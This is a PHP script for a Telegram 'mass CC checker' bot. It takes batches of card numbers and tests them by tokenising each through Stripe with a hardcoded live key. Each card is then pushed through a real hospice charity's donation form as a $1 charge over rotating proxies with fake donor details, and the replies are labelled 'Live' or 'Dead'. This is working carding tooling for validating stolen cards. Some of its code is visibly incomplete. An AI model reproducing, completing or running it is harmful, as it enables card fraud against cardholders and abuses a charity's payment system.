<?php

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
//====================FUNCTION END===============//
if (strpos($message, "/mchk") === 0 || strpos($message, "!mchk") === 0 || strpos($message, ".mchk") === 0) {
    $message = substr($message,6);
if (empty($message)){
reply_to($chatId,$validauth,$message_id);
exit();
}
$stchk = "<b>Started Checking...</b>";
    $sendmes = "https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".$stchk."&reply_to_message_id=".$message_id."&parse_mode=HTML";
    $sent = json_decode(file_get_contents($sendmes) ,1);
    global $mes_id;
    $mes_id = $sent['result']['message_id'];
    sleep(1);
    $aray = gibarray($message);
    $cout = count($aray);
    $total = $cout * 2;
    if (count($aray) > 5){
  $cmsg = "This Gate Limited To Check For 5 CCs Only.";
  editMessage($chatId,$cmsg,$mes_id);
    exit();
}
    else{
      global $fullmes;
      $fullmes = '';
	  //echo '<pre>'; print_r($aray); echo '</pre>';
      foreach ($aray as $cc){
		//echo "Checking : $cc <br>";
        $check = chemker1($cc);
		//echo "Result For $cc : $result<hr>";
      }
    }
}

function chemker1($lista){

  ///-----------------------CC PARSE -----------------------///
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=4bbd7843-3f30-472c-aa17-bea2923e58007c680c&sid=497c8554-6c45-4140-87ff-6590857b1cd03febcc&pasted_fields=number&payment_user_agent=stripe.js%2F42e38e0277%3B+stripe-js-v3%2F42e38e0277%3B+card-element&referrer=https%3A%2F%2Fhospicesenb.ca&time_on_page=104300&key=pk_live_51HSROsJidSrnbkCNweqOnOTO7wQwLWX6mRFNAP83H5YChtLFqLZTae4AhfoW7ATeXJ2x96XZQyaMetW9dPS1pEaR00ju9n1ZPO');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://hospicesenb.ca/wp-admin/admin-ajax.php?t=1712216339006');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1712216339006 h2',
'Host: hospicesenb.ca',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://hospicesenb.ca',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://hospicesenb.ca/donate/',
'accept-language: en-US,en;q=0.9',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=ak_hp_textarea%3D%26ak_js%3D1712216166069%26__fluent_form_embded_post_id%3D743%26_fluentform_3_fluentformnonce%3D3681263a9a%26_wp_http_referer%3D%252Fdonate%252F%26dropdown_8%3DOne%2520Time%26dropdown%3DIndividual%26dropdown_1%3DGeneral%26custom-payment-amount%3D1%26payment_method_3%3Dstripe%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26input_text_2%3D0817480671%26email%3Dgloosmoke%2540gmail.com%26address1%255Baddress_line_1%255D%3DStreet%252027%26address1%255Baddress_line_2%255D%3DNew%2520York%26address1%255Bcity%255D%3DNY%26address1%255Bzip%255D%3D10014%26address1%255Bcountry%255D%3DUS%26dropdown_4%3D%26description%3D%26dropdown_5%3D%26description_1%3D%26description_2%3D%26description_3%3D%26description_4%3D%26ak_bib%3D1712216175209%26ak_bfs%3D1712216247002%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B%26ak_bmcc%3D19%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D6%26ak_btmc%3D0%26ak_bsc%3D23%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B%26ak_bib%3D1712216175209%26ak_bfs%3D1712216271012%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B6%252C12021%253B18%252C1718%253B10%252C10245%253B%26ak_bmcc%3D22%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D7%26ak_btmc%3D0%26ak_bsc%3D29%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B8%252C204%253B%26__entry_intermediate_hash%3D907b45810dec7141db43ddd31dc98909%26ak_bib%3D1712216175209%26ak_bfs%3D1712216337482%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B6%252C12021%253B18%252C1718%253B10%252C10245%253B8%252C65029%253B3%252C1429%253B%26ak_bmcc%3D24%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D7%26ak_btmc%3D0%26ak_bsc%3D32%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B8%252C204%253B%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');

$result2a = curl_exec($ch);

$dmsg = trim(strip_tags(getStr($result2a,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

curl_close($ch);

if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))){
      $status = "Live 🟡";
      $response = "Zip Mismatch ❎";
    }


elseif (strpos($result2a, "CVV LIVE")){
  $status = "Live 🟢";
$response = "CVV Matched ✅";
  }
elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insufficient_funds"))){
  $status = "CVV Live 🟢";
$response = "INSUFFICIENT FUNDS ✅";

  }
elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "The card's security code is incorrect."))){
  $status = "Live 🟡";
$response = "CCN Live ❎";

  }
elseif ((strpos($result2a, "TRANSACTION NOT ALLOWED")) || (strpos($result2a, "transaction_not_allowed"))){
  $status = "Live 🟡";
$response = "TRANSACTION NOT ALLOWED";

  }

elseif (strpos($result2a, "DO NOT HONOR")){
  
$status = "Dead 🔴";
$response = "DO NOT HONOR 🚫";
}

elseif (strpos($result2a, "stolen_card")){
  
$status = "Dead 🔴";
$response = "Stolen Card 🚫";
}

elseif (strpos($result2a, "lost_card")){
  $status = "Dead 🔴";
$response = "Lost Card 🚫";
}


elseif (strpos($result2a, "PICKUP CARD")){
  $status = "Dead 🔴";
$response = "PICKUP CARD";
}


elseif ((strpos($result2a, 'INCORRECT CARD NUMBER')) || (strpos($result2a, 'Your card number is incorrect.')) || (strpos($result2a, 'incorrect_number'))){
  
  $status = "Dead 🔴";
$response = "Incorrect Card Number 🚫";
}


elseif ((strpos($result2a, 'Your card has expired.')) || (strpos($result2a, 'expired_card'))){
  $status = "Dead 🔴";
$response = "Expired Card 🚫";

  }


elseif (strpos($result2a, 'Thank you for your donation. We will get in touch with you shortly')){
  $status = "Live 🟢";
$response = "Charged 1$";

  }


elseif (strpos($result2a, "FRAUDULENT")){
  $status = "Dead 🔴";
$response = "Fraudulent 🚫";
}


elseif (strpos($result2a, "lock_timeout")){
  $status = "Dead 🔴";
$response = "error 404 🚫";
}


elseif ((strpos($result2a, "Your card was declined.")) || (strpos($result2a, 'The card was declined.'))){
  $status = "Dead 🔴";
$response = "Generic Decline 🚫";
}


elseif (strpos($result2a, "NVAILD EXPIRY MONTH")){
  $status = "Dead 🔴";
$response = "NVAILD EXPIRY MONTH 😥";
}



elseif (strpos($result2a, "Error processing payment")){
  $status = "Dead 🔴";
$response = "Error processing payment";
}

elseif (strpos($result2a, 'CARD NOT SUPPORTED')){
  $status = "Live 🟡";
$response = "CARD NOT SUPPORTED 🚫";
}


elseif (strpos($result2a, "parameter_invalid_empty")){
  $status = "Dead 🔴";
$response = "404 error 🚫";
}

else {
      $status = "Dead 🔴";
$response = "";

    }
//--------SMS SENT SECTION----------------//
  global $mes_id, $chatId , $fullmes;
$mainulstatus = "<b>Dead 🔴</b>";
$fullmes = $fullmes.'<b>CC - <code>'.$lista.'</code>
Result - '.$response.'</b>

';
$umass = "<b>𒀭  MASS CCN CHARGE 1 $  𒀭
   ━━━━━━━━━━━━━</b>
";
$fmass = "<b>╭───────────────
𒆜 PROXY  : [ LIVE & ROTATING ]
𒆜 BOT BY : <a href='t.me/strawhatchannel69'>[ BE - OWNER  ]</a>
╰───────────────✘</b>";

$mallmsg = urlencode ("$umass
$fullmes
$fmass");
editMessagei($chatId,$mallmsg,$mes_id);

}
